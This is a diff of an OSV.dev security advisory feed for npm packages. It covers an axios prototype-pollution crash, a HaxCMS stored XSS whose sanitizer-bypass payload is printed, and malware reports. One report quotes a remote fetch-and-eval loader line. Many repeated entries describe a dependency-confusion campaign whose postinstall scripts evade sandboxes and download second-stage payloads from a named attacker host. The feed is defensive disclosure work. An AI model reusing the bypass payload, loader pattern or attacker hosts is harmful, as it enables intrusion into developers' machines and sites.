+2. **Crash DoS** - `lib/core/mergeConfig.js` line 26 builds the `hasOwnProperty` descriptor as a plain-object literal. `Object.defineProperty` reads `descriptor.get`/`descriptor.set` via the prototype chain, so a polluted `Object.prototype.get` or…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/axios/axios/security/advisories/GHSA-898c-q2cr-xwhg"&gt;https://github.com/axios/axios/security/advisories/GHSA-898c-q2cr-xwhg&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2018-16487"&gt;https://nvd.nist.gov/vuln/detail/CVE-2018-16487&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/axios/axios"&gt;https://github.com/axios/axios&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-898c-q2cr-xwhg"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-g2g8-95qg-v35h: HaxCMS has a stored Cross-Site Scripting (XSS) bypass in its saveNode endpoint</title>
+    <id>https://osv.dev/vulnerability/GHSA-g2g8-95qg-v35h</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-g2g8-95qg-v35h"/>
+    <published>2026-05-29T14:07:51Z</published>
+    <updated>2026-05-29T14:15:06Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-48527"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;HaxCMS has a stored Cross-Site Scripting (XSS) bypass in its saveNode endpoint&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-48527&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@haxtheweb/haxcms-nodejs&lt;/code&gt; — fixed in 26.0.1&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+HaxCMS is affected by a stored cross-site scripting (XSS) vulnerability in the `/system/api/saveNode` endpoint. An authenticated user with a permission to edit pages can bypass the HTML sanitizer by injecting an event handler attribute without whitespace before the attribute name.
+
+For example, the sanitizer misses:
+
+```html
+&amp;lt;a href=&amp;quot;#&amp;quot;onclick=&amp;quot;alert(&amp;#x27;kn1ph&amp;#x27;)&amp;quot;&amp;gt;click me&amp;lt;/a&amp;gt;
+```
+
+The important bypass is:
+
+```html
+href=&amp;quot;#&amp;quot;onclick=
+```
+
+The payload is stored in the generated page files and executes when a user clicks the injected link.
+
+## Details
+
+The issue is caused by regex-based HTML sanitization that expects whitespace before event handler attributes. Because the sanitizer expects a pattern like:
+
+```html
+href=&amp;quot;#&amp;quot; onclick=&amp;quot;...&amp;quot;
+```
+
+It fails to remove an event handler when it …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-g2g8-95qg-v35h"&gt;https://github.com/haxtheweb/issues/security/advisories/GHSA-g2g8-95qg-v35h&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/haxtheweb/issues"&gt;https://github.com/haxtheweb/issues&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-g2g8-95qg-v35h"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-2920: Malicious code in buffer-util-extend (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-2920</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-2920"/>
+    <published>2026-04-14T10:22:11Z</published>
+    <updated>2026-05-29T13:31:33Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-g44v-3gq3-j8p6"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in buffer-util-extend (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-g44v-3gq3-j8p6&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;buffer-util-extend&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (374d8c5c4c32544741d1ea3788cfbccc3ee175f7181f8bdfa71cf4fde44121eb)
+On require/import, index.js decodes a base64 string literal to https://www.jsonkeeper.com/b/CWOV9, fetches that anonymous JSON paste, and passes the response&amp;#x27;s `content` field to `eval()` (index.js:46 stores the base64-encoded URL; index.js:59-65 performs `fetch(atob(...)).then(t=&amp;gt;t.json()).then(data =&amp;gt; eval(data.content))`). Any consumer that `require`s this package executes whatever JavaScript is currently hosted at the mutable paste URL — full arbitrary code execution on the installer/build machine, with the operator able to swap payloads at any time without republishing the package. The package additionally impersonates the widely-…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/buffer-util-extend/v/1.0.13"&gt;https://www.npmjs.com/package/buffer-util-extend/v/1.0.13&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/buffer-util-extend/v/1.0.11"&gt;https://www.npmjs.com/package/buffer-util-extend/v/1.0.11&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-g44v-3gq3-j8p6"&gt;https://github.com/advisories/GHSA-g44v-3gq3-j8p6&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-2920"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
   <entry>
     <title>[NEW] MAL-2026-5030: Malicious code in tiny-naturalsort (npm)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-5030</id>
@@ -1449,258 +1946,5 @@ On installation, the `postinstall` hook executes `scripts/postinstall.js`. The s
     <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @car-loans/deal (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@car-loans/deal&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@car-loans`, `@fb-deposit`, and `@debit-ib` npm scopes. The attacker (npm user **pik-libs**) published 25 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages. The campaign shares infrastructure (`https://oob.moika.tech`) and an identical postinstall payload with a concurrent campaign by npm user **mr.4nd3r50n**.
 
 On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file in the syste…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4866"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4867: Malicious code in @car-loans/deal-aff (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4867</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4867"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:50Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @car-loans/deal-aff (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@car-loans/deal-aff&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@car-loans`, `@fb-deposit`, and `@debit-ib` npm scopes. The attacker (npm user **pik-libs**) published 25 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages. The campaign shares infrastructure (`https://oob.moika.tech`) and an identical postinstall payload with a concurrent campaign by npm user **mr.4nd3r50n**.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file in the syste…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4867"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4865: Malicious code in @car-loans/close-flow-module (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4865</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4865"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:50Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @car-loans/close-flow-module (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@car-loans/close-flow-module&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@car-loans`, `@fb-deposit`, and `@debit-ib` npm scopes. The attacker (npm user **pik-libs**) published 25 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages. The campaign shares infrastructure (`https://oob.moika.tech`) and an identical postinstall payload with a concurrent campaign by npm user **mr.4nd3r50n**.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file in the syste…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4865"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4864: Malicious code in @car-loans/application-aff (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4864</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4864"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:50Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @car-loans/application-aff (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@car-loans/application-aff&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@car-loans`, `@fb-deposit`, and `@debit-ib` npm scopes. The attacker (npm user **pik-libs**) published 25 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages. The campaign shares infrastructure (`https://oob.moika.tech`) and an identical postinstall payload with a concurrent campaign by npm user **mr.4nd3r50n**.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file in the syste…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4864"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4868: Malicious code in @car-loans/desktop-car-loans-application (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4868</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4868"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:50Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @car-loans/desktop-car-loans-application (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@car-loans/desktop-car-loans-application&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@car-loans`, `@fb-deposit`, and `@debit-ib` npm scopes. The attacker (npm user **pik-libs**) published 25 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages. The campaign shares infrastructure (`https://oob.moika.tech`) and an identical postinstall payload with a concurrent campaign by npm user **mr.4nd3r50n**.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file in the syste…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4868"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4863: Malicious code in @car-loans/applicaion-aff (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4863</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4863"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:50Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @car-loans/applicaion-aff (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@car-loans/applicaion-aff&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@car-loans`, `@fb-deposit`, and `@debit-ib` npm scopes. The attacker (npm user **pik-libs**) published 25 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages. The campaign shares infrastructure (`https://oob.moika.tech`) and an identical postinstall payload with a concurrent campaign by npm user **mr.4nd3r50n**.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file in the syste…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4863"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4912: Malicious code in @cloudplatform-single-spa/dataplatform-trino (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4912</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4912"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:49Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/dataplatform-trino (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/dataplatform-trino&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4912"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4911: Malicious code in @cloudplatform-single-spa/dataplatform-spark (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4911</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4911"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:49Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/dataplatform-spark (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/dataplatform-spark&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4911"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4910: Malicious code in @cloudplatform-single-spa/dataplatform-nessie (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4910</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4910"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:49Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/dataplatform-nessie (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/dataplatform-nessie&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4910"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4909: Malicious code in @cloudplatform-single-spa/dataplatform-metastore (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4909</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4909"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:49Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/dataplatform-metastore (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/dataplatform-metastore&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4909"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4908: Malicious code in @cloudplatform-single-spa/dataplatform-flink (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4908</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4908"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:49Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/dataplatform-flink (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/dataplatform-flink&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4908"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4907: Malicious code in @cloudplatform-single-spa/dataplatform-connections (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4907</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4907"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:49Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/dataplatform-connections (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/dataplatform-connections&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4907"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4906: Malicious code in @cloudplatform-single-spa/dataplatform-clusters (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4906</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4906"/>
-    <published>2026-05-28T00:00:00Z</published>
-    <updated>2026-05-29T00:01:49Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @cloudplatform-single-spa/dataplatform-clusters (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@cloudplatform-single-spa/dataplatform-clusters&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Part of a dependency confusion attack campaign targeting the `@cloudplatform-single-spa` and `@mlspace` npm scopes. The attacker (npm user **mr.4nd3r50n**) published 139 scoped packages at the inflated version `99.99.99`, which resolves ahead of any private registry version via npm&amp;#x27;s default version resolution, silently hijacking installs of internal packages.
-
-On installation, the `postinstall` hook executes `scripts/postinstall.js`. The script waits 3 seconds (sandbox evasion), then downloads an OS-specific second-stage JavaScript payload from `https://oob.moika.tech/payload/{mac|win|linux}.js`, writes it to a temporary file (`._cloudplatform-single-spa_init.js` in the system temp directory), and spawns it as a detached Node.js process that continues running after npm exits. The payload …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://safedep.io/oob-moika-tech-dependency-confusion-campaign/"&gt;https://safedep.io/oob-moika-tech-dependency-confusion-campaign/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4906"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-4905: Malicious code in @cloudplatform-single-spa/dataplatform-cloudberry (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-4905</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4905"/>
